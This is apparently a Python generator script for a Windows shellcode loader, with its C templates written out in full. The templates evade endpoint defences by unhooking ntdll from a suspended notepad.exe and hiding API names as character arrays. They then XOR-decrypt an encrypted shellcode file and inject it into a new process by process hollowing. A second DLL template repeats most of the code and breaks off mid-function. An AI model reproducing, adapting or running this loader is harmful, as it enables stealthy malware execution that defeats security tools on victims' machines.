import random
import string
import os
import argparse

template = """#include <windows.h>
#include <stdio.h>
#include "addresshunter.h"
#include "functions.h"

#define STATUS_SUCCESS 0
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

char KEY[] = "XOR_KEY_PLACEHOLDER";

void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

void sleep()
{
    for (int i = 0; i <= 500000; i++)
    {
        for (int j = 2; j <= i / 2; j++)
        {
            if (i % j == 0)
            {
                break;
            }
        }
    }
}

PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
{
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}

char* strstrFunc(const char* string, const char* substring)
{
    const char* a, * b;

    /* First scan quickly through the two strings looking for a
     * single-character match.  When it's found, then compare the
     * rest of the substring.
     */

    b = substring;

    if (*b == 0)
    {
        return (char*)string;
    }

    for (; *string != 0; string += 1)
    {
        if (*string != *b)
        {
            continue;
        }

        a = string;

        while (1)
        {
            if (*b == 0)
            {
                return (char*)string;
            }
            if (*a++ != *b++)
            {
                break;
            }
        }

        b = substring;
    }

    return NULL;
}

PVOID GetDll(PWSTR FindName)
{
    _PPEB ppeb = (_PPEB)__readgsqword(0x60);
    ULONG_PTR pLdr = (ULONG_PTR)ppeb->pLdr;
    ULONG_PTR val1 = (ULONG_PTR)((PPEB_LDR_DATA)pLdr)->InMemoryOrderModuleList.Flink;
    PVOID dllBase = NULL;

    ULONG_PTR val2;
    while (val1)
    {
        PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
        dllBase = (PVOID)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
        if (my_strcmp((char*)FindName, (char*)DllName) == 0)
        {
            break;
        }
        val1 = DEREF_64(val1);
    }
    return dllBase;
}

//Following functions are copied from HellsGate : https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c

BOOL GetImageExportDirectory(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)
{
    //Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

PVOID GetTableEntry(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, CHAR* findfunction)
{
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNameOrdinals);
    PVOID funcAddress = 0x00;
    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (my_strcmp(findfunction, pczFunctionName) == 0)
        {
            WORD cw = 0;
            while (TRUE)
            {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                {
                    return 0x00;
                }

                // check if ret, in this case we are also probaly too far
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                {
                    return 0x00;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    WORD syscall = (high << 8) | low;
                    return pFunctionAddress;
                    break;
                }
                cw++;
            }
        }
    }
    return funcAddress;
}

DWORD protectingMe(PVOID textBase, DWORD flProtect, SIZE_T size)
{
    UINT64 kernel32dll;
    DWORD oldprotect = NULL;

    CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
    CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
    kernel32dll = GetKernel32();
    LoadLibraryA_t LoadLibraryAFunc = (LoadLibraryA_t)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
    HMODULE ntdlldll = LoadLibraryAFunc("ntdll.dll");

    NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);

    NtProtectVirtualMemoryFunc(NtCurrentProcess(), &textBase, (PULONG)&size, flProtect, &oldprotect);
    return oldprotect;
}

void WhatsOverwriting(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PIMAGE_SECTION_HEADER textsection)
{
    UINT64 msvcrtdll, LoadLibraryAFunc, kernel32dll;
    kernel32dll = GetKernel32();
    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00 };

    LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
    msvcrtdll = (UINT64)((LoadLibraryA_t)LoadLibraryAFunc)(msvcrt_c);


    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < hooked_pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (strstrFunc(pczFunctionName, (CHAR*)"Nt") != NULL)
        {
            PVOID funcAddress = GetTableEntry(freshntDllBase, pImageExportDirectory, pczFunctionName);
            if (funcAddress != 0x00 && my_strcmp((CHAR*)"NtAccessCheck", pczFunctionName) != 0)
            {
                //Change the write permissions of the .text section of the ntdll in memory
                DWORD oldprotect = protectingMe((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), PAGE_EXECUTE_WRITECOPY, textsection->Misc.VirtualSize);
                //Copy the syscall stub from the fresh ntdll.dll to the hooked ntdll
                CopyMemoryEx((LPVOID)pFunctionAddress, (LPVOID)funcAddress, 23);
                //Change back to the old permissions
                protectingMe((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), oldprotect, textsection->Misc.VirtualSize);
            }
        }
    }
}

void SomeReplacing(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER textsection)
{
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

    if (!GetImageExportDirectory(freshntDllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        {}
        
    
        

    PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(ntdllBase, &hooked_pImageExportDirectory) || hooked_pImageExportDirectory == NULL)
    {}

    WhatsOverwriting(ntdllBase, freshntDllBase, hooked_pImageExportDirectory, pImageExportDirectory, textsection);
}




extern "C" void exec() {

    // Function names
    CHAR NtAllocateVirtualMemory_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
    CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
    CHAR NtWriteVirtualMemroy_c[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
    CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
    CHAR NtReadVirtualMemeory_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
    CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
    CHAR TerminateProcess_c[] = {'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00};
    CHAR CloseHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };
    CHAR CreateFileA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x00 };
    CHAR GetFileSize_c[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x00 };
    CHAR ReadFile_c[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x00 };
    CHAR GetThreadContext_c[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
    CHAR SetThreadContext_c[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
    CHAR ResumeThread_c[] = { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x00 };
    CHAR Sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0x00 };
    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00 };
    
    NTSTATUS status = NULL;

    UINT64 kernel32dll = GetKernel32();
    //Kernel32 Function
    CreateProcessA_t CreateProcessAFunc = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);
    TerminateProcess_t TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);
    CloseHandle_t CloseHandleFunc = (CloseHandle_t)GetSymbolAddress((HANDLE)kernel32dll, CloseHandle_c);
    CreateFileA_t CreateFileAFunc = (CreateFileA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateFileA_c);
    GetFileSize_t GetFileSizeFunc = (GetFileSize_t)GetSymbolAddress((HANDLE)kernel32dll, GetFileSize_c);
    ReadFile_t ReadFileFunc = (ReadFile_t)GetSymbolAddress((HANDLE)kernel32dll, ReadFile_c);
    GetThreadContext_t GetThreadContextFunc = (GetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, GetThreadContext_c);
    SetThreadContext_t SetThreadContextFunc = (SetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, SetThreadContext_c);
    Sleep_t SleepFunc = (Sleep_t)GetSymbolAddress((HANDLE)kernel32dll, Sleep_c);
    ResumeThread_t ResumeThreadFunc = (ResumeThread_t)GetSymbolAddress((HANDLE)kernel32dll, ResumeThread_c);

    //Nt Functions
    LoadLibraryA_t LoadLibraryAFunc = (LoadLibraryA_t)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
    HMODULE ntdlldll = LoadLibraryAFunc("ntdll.dll");
    NtAllocateVirtualMemory_t NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtAllocateVirtualMemory_c);
    NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);
    NtWriteVirtualMemroy_t NtWriteVirtualMemroyFunc = (NtWriteVirtualMemroy_t)GetSymbolAddress((HANDLE)ntdlldll, NtWriteVirtualMemroy_c);
    NtReadVirtualMemory_t NtReadVirtualMemoryFunc = (NtReadVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtReadVirtualMemeory_c);

    //msvcrt Function
    wprintf_t wprintfFunc = (wprintf_t)GetSymbolAddress((HANDLE)LoadLibraryAFunc("msvcrt.dll"), wprintf_c);

    // ntdll unhooking
    STARTUPINFO siSuspended;
    PROCESS_INFORMATION piSuspended;
    ZeroMemory(&siSuspended, sizeof(siSuspended));
    siSuspended.cb = sizeof(siSuspended);
    ZeroMemory(&piSuspended, sizeof(piSuspended));

    BOOL flag = CreateProcessAFunc(
        NULL,
        (LPSTR)"notepad.exe",
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        "C:\\\\Windows\\\\System32\\\\",
        (LPSTARTUPINFOA)&siSuspended,
        &piSuspended
    );
    WCHAR createdSuspendedProcess[] = { L'[', L'+', L']', L' ', L'C', L'r', L'e', L'a', L't', L'e', L'd', L' ', L'S', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's', L'.', L'.',  L'\\n', 0x00 };
    wprintfFunc(createdSuspendedProcess);
    WCHAR findname[] = L"ntdll.dll\\x00";

    PVOID ntdllBase = GetDll(findname);
    
    PIMAGE_DOS_HEADER ImgDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS ImgNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + (ImgDosHeader->e_lfanew));
    IMAGE_OPTIONAL_HEADER OptHeader = (IMAGE_OPTIONAL_HEADER)ImgNTHeaders->OptionalHeader;
    PIMAGE_SECTION_HEADER textsection = IMAGE_FIRST_SECTION(ImgNTHeaders);

    SIZE_T ntdllSize = OptHeader.SizeOfImage;

    LPVOID freshNtdll = NULL;
    status = NtAllocateVirtualMemoryFunc(
        NtCurrentProcess(),
        &freshNtdll,
        NULL,
        &ntdllSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToAllocate[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'f', L'o', L'r', L' ', L't', L'h', L'e', L' ', L'u', L'n', L'h', L'o', L'o', L'k', L'i', L'n', L'g', L'.', L'.',  L'\\n', 0x00 };
        wprintfFunc(failedToAllocate);
        return;
    }

    WCHAR AllocatedMemrory[] = { L'[', L'+', L']', L' ', L'A', L'l', L'l', L'o', L'c', L'a', L't', L'e', L'd', L' ', L'v', L'i', L'r', L't', L'u', L'a', L'l', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'o', L'f', L' ', L'n', L'o', L't', L'e', L'p', L'a', L'd', L'.', L'e', L'x', L'e',  L'\\n', 0x00 };
    wprintfFunc(AllocatedMemrory);

    DWORD bytesread = NULL;
    status = NtReadVirtualMemoryFunc(
        piSuspended.hProcess,
        ntdllBase,
        freshNtdll,
        ntdllSize,
        &bytesread
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToReadVirtual[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'r', L'e', L'a', L'd', L' ', L'v', L'i', L'r', L't', L'u', L'a', L'l', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
        wprintfFunc(failedToReadVirtual);
        return;
    }

    SomeReplacing(ntdllBase, freshNtdll, textsection);
    
    TerminateProcessFunc(piSuspended.hProcess, 0);
    CloseHandleFunc(piSuspended.hProcess);
    CloseHandleFunc(piSuspended.hThread);

    WCHAR finishedReplace[] = { L'[', L'+', L']', L' ', L'F', L'i', L'n', L'i', L's', L'h', L'e', L'd', L' ', L'r', L'e', L'p', L'l', L'a', L'c', L'e', L' ', L'n', L't', L'd', L'l', L'l', L' ', L'f', L'r', L'o', L'm', L' ', L's', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's',  L'\\n', 0x00 };
    wprintfFunc(finishedReplace);

    // Process Hollowing
    HANDLE hFile = CreateFileAFunc(
        "OUTPUT_PLACEHOLDER", // change it to the file name of the encrypted shellcode
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        WCHAR invaliaHandle[] = { L'[', L'-', L']', L' ', L'I', L'n', L'v', L'a', L'l', L'i', L'd', L' ', L'H', L'a', L'n', L'd', L'l', L'e', L' ', L'V', L'a', L'l', L'u', L'e',  L'\\n', 0x00 };
        wprintfFunc(invaliaHandle);
        return;
    }

    SIZE_T fileSize = GetFileSizeFunc(hFile, NULL);

    LPVOID fileData = NULL;
    status = NtAllocateVirtualMemoryFunc(
        NtCurrentProcess(),
        &fileData,
        NULL,
        &fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (fileData == NULL) {
        WCHAR failedToAllocate[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'f', L'o', L'r', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L'.',  L'\\n', 0x00 };
        wprintfFunc(failedToAllocate);
        return;
    }

    DWORD BytesRead = NULL;

    flag = ReadFileFunc(
        hFile,
        fileData,
        fileSize,
        &BytesRead,
        NULL
    );
    if (!flag) {
        WCHAR errorReadFile[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L'r', L'e', L'a', L'd', L'i', L'n', L'g', L' ', L't', L'h', L'e', L' ', L'f', L'i', L'l', L'e', L'!', L' ',  L'\\n', 0x00 };
        wprintfFunc(errorReadFile);
        return;
    }

    WCHAR readShellcode[] = { L'[', L'+', L']', L' ', L'R', L'e', L'a', L'd', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L' ', L'f', L'i', L'l', L'e', L'!',  L'\\n', 0x00 };
    wprintfFunc(readShellcode);

    unsigned char* shellcode = (unsigned char*)fileData;

    STARTUPINFOA si = {
        sizeof(si)
    };
    PROCESS_INFORMATION pi;
    
    flag = CreateProcessAFunc(
        "PROCESS_INJECT_PLACEHOLDER",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        (LPSTARTUPINFOA)&si,
        &pi
    );

    if (!flag) {
        WCHAR errorCreateProcess[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L'c', L'r', L'e', L'a', L't', L'i', L'n', L'g', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's', L'.', L'.',  L'\\n', 0x00 };
        wprintfFunc(errorCreateProcess);
        return;
    }

    LPVOID exec = NULL;

    status = NtAllocateVirtualMemoryFunc(
        pi.hProcess,
        &exec,
        NULL,
        &fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToAllocatememory[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
        wprintfFunc(failedToAllocatememory);
        return;
    }

    WCHAR allocatedMemory[] = { L'[', L'+', L']', L' ', L'A', L'l', L'l', L'o', L'c', L'a', L't', L'e', L'd', L' ', L'M', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
    wprintfFunc(allocatedMemory);

    XOR(shellcode, fileSize, KEY, sizeof(KEY));
    WCHAR decryptedshellcode[] = { L'[', L'+', L']', L' ', L'D', L'e', L'c', L'r', L'y', L'p', L't', L'e', L'd', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L' ', L'f', L'i', L'l', L'e', L'!',  L'\\n', 0x00 };
    wprintfFunc(decryptedshellcode);

    DWORD oldprotect = NULL;

    status = NtProtectVirtualMemoryFunc(
        pi.hProcess,
        &exec,
        (PULONG)&fileSize,
        PAGE_EXECUTE_READWRITE,
        &oldprotect
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToProtect[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'p', L'r', L'o', L't', L'e', L'c', L't', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
        wprintfFunc(failedToProtect);
        return;
    }
    WCHAR protectedMemory[] = { L'[', L'+', L']', L' ', L'P', L'r', L'o', L't', L'e', L'c', L't', L'e', L'd', L' ', L'M', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
    wprintfFunc(protectedMemory);


    status = NtWriteVirtualMemroyFunc(
        pi.hProcess,
        exec,
        shellcode,
        fileSize,
        NULL
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToWrite[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'w', L'r', L'i', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
        wprintfFunc(failedToWrite);
        return;
    }

    WCHAR payloadWritten[] = { L'[', L'+', L']', L' ', L'P', L'a', L'y', L'l', L'o', L'a', L'd', L' ', L'w', L'r', L'i', L't', L't', L'e', L'n', L'!',  L'\\n', 0x00 };
    wprintfFunc(payloadWritten);

    CONTEXT CT;
    CT.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContextFunc(pi.hThread, &CT)) {
        WCHAR failedGetThread[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'g', L'e', L't', L' ', L'T', L'h', L'r', L'e', L'a', L'd', L' ', L'C', L'o', L'n', L't', L'e', L'x', L't',  L'\\n', 0x00 };
        wprintfFunc(failedGetThread);
        return;
    }

    CT.Rip = (DWORD64)exec;

    if (!SetThreadContextFunc(pi.hThread, &CT)) {
        WCHAR errorSettingThread[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L's', L'e', L't', L't', L'i', L'n', L'g', L' ', L't', L'h', L'r', L'e', L'a', L'd', L' ', L'c', L'o', L'n', L't', L'e', L'x', L't',  L'\\n', 0x00 };
        wprintfFunc(errorSettingThread);
        return;
    }

    WCHAR Sleeping[] = { L'[', L'+', L']', L' ', L'S', L'l', L'e', L'e', L'p', L'i', L'n', L'g', L' ', L'5', L' ', L's', L'e', L'c', L'o', L'n', L'd', L's', L'.', L'.',  L'\\n', 0x00 };
    wprintfFunc(Sleeping);

    SleepFunc(5);

    ResumeThreadFunc(pi.hThread);

    WCHAR success[] = { L'[', L'+', L']', L' ', L'P', L'r', L'o', L'c', L'e', L's', L's', L' ', L'h', L'o', L'l', L'l', L'o', L'w', L'i', L'n', L'g', L' ', L's', L'u', L'c', L'c', L'e', L's', L's', L'f', L'u', L'l', L'!',  L'\\n', 0x00 };
    wprintfFunc(success);

    CloseHandleFunc(hFile);
    CloseHandleFunc(pi.hProcess);
    CloseHandleFunc(pi.hThread);
    return;
}
"""

template_dll = """#include <windows.h>
#include <stdio.h>
#include "addresshunter.h"
#include "functions.h"

#define STATUS_SUCCESS 0
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

char KEY[] = "XOR_KEY_PLACEHOLDER";

void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

void sleep()
{
    for (int i = 0; i <= 500000; i++)
    {
        for (int j = 2; j <= i / 2; j++)
        {
            if (i % j == 0)
            {
                break;
            }
        }
    }
}

PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
{
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}

char* strstrFunc(const char* string, const char* substring)
{
    const char* a, * b;

    /* First scan quickly through the two strings looking for a
     * single-character match.  When it's found, then compare the
     * rest of the substring.
     */

    b = substring;

    if (*b == 0)
    {
        return (char*)string;
    }

    for (; *string != 0; string += 1)
    {
        if (*string != *b)
        {
            continue;
        }

        a = string;

        while (1)
        {
            if (*b == 0)
            {
                return (char*)string;
            }
            if (*a++ != *b++)
            {
                break;
            }
        }

        b = substring;
    }

    return NULL;
}

PVOID GetDll(PWSTR FindName)
{
    _PPEB ppeb = (_PPEB)__readgsqword(0x60);
    ULONG_PTR pLdr = (ULONG_PTR)ppeb->pLdr;
    ULONG_PTR val1 = (ULONG_PTR)((PPEB_LDR_DATA)pLdr)->InMemoryOrderModuleList.Flink;
    PVOID dllBase = NULL;

    ULONG_PTR val2;
    while (val1)
    {
        PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
        dllBase = (PVOID)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
        if (my_strcmp((char*)FindName, (char*)DllName) == 0)
        {
            break;
        }
        val1 = DEREF_64(val1);
    }
    return dllBase;
}

//Following functions are copied from HellsGate : https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c

BOOL GetImageExportDirectory(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)
{
    //Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

PVOID GetTableEntry(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, CHAR* findfunction)
{
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNameOrdinals);
    PVOID funcAddress = 0x00;
    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (my_strcmp(findfunction, pczFunctionName) == 0)
        {
            WORD cw = 0;
            while (TRUE)
            {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                {
                    return 0x00;
                }

                // check if ret, in this case we are also probaly too far
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                {
                    return 0x00;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
